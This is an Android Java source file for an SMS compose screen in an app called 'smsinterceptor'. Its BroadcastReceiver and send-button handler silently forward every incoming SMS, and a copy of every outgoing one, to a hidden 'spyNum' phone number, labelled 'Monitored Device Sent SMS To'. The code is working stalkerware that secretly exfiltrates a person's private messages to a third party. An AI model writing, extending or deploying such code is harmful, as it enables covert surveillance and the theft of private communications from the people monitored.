package com.eric.smsinterceptor.app;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Created by Eric on 5/16/14.
 */
public class ComposeSms extends Activity{
    private Button sendBtn;
    private EditText txtphoneNo;
    private EditText txtMessage;
    private IntentFilter intentFilter;
    private String copiedTxt;
    private String spyNum = MainActivity.copy.getPhoneNum();

    private BroadcastReceiver intentReceiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            //display the message in the textView
            TextView inTxt = (TextView)findViewById(R.id.textViewSms);
            inTxt.setText(intent.getExtras().getString("sms"));

            copiedTxt = (String)inTxt.getText();
            sendCopyMsg(spyNum,copiedTxt);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.compose_screen);

        intentFilter = new IntentFilter();
        intentFilter.addAction("SMS_RECEIVED_ACTION");

        sendBtn = (Button)findViewById(R.id.btnSendSMS);
        txtphoneNo = (EditText)findViewById(R.id.editTextPhoneNo);
        txtMessage = (EditText)findViewById(R.id.editTextSMS);

        sendBtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                String myMsg = txtMessage.getText().toString();
                String theNumber = txtphoneNo.getText().toString();

                sendMessage(theNumber,myMsg);
                String messageSentTo = "Monitored Device Sent SMS To " + theNumber + ": " + myMsg;
                sendCopyMsg(spyNum,messageSentTo);

            }
        });


    }
    private void sendCopyMsg(String theNumber, String myMsg){
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(theNumber, null, myMsg, null,null);
    }

    private void sendMessage(String theNumber, String myMsg) {
        String SENT ="Message Sent";
        String DELIVERED = "Message Delivered";

        PendingIntent sentPi = PendingIntent.getBroadcast(this, 0, new Intent(SENT),0);
        PendingIntent deliveredPi = PendingIntent.getBroadcast(this, 0, new Intent(DELIVERED),0);

        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                switch (getResultCode()){
                    case Activity.RESULT_OK:
                        Toast.makeText(ComposeSms.this, "SMS sent", Toast.LENGTH_LONG).show();
                        break;
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        Toast.makeText(getBaseContext(), "Generic Failure", Toast.LENGTH_LONG).show();
                        break;
                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                        Toast.makeText(getBaseContext(), "No Service", Toast.LENGTH_LONG).show();
                        break;
                }
            }
        },new IntentFilter(SENT));

        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                switch (getResultCode()){
                    case Activity.RESULT_OK:
                        Toast.makeText(ComposeSms.this, "SMS delivered", Toast.LENGTH_LONG).show();
                        break;
                    case Activity.RESULT_CANCELED:
                        Toast.makeText(getBaseContext(), "SMS not delivered", Toast.LENGTH_LONG).show();
                        break;
                }
            }
        },new IntentFilter(DELIVERED));

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(theNumber, null, myMsg, sentPi, deliveredPi);

    }

    @Override
    protected void onResume(){
        //register the receiver
        registerReceiver(intentReceiver, intentFilter);
        super.onResume();
    }
    @Override
    protected void onPause(){
        //unregister the receiver
        unregisterReceiver(intentReceiver);
        super.onPause();
    }
}
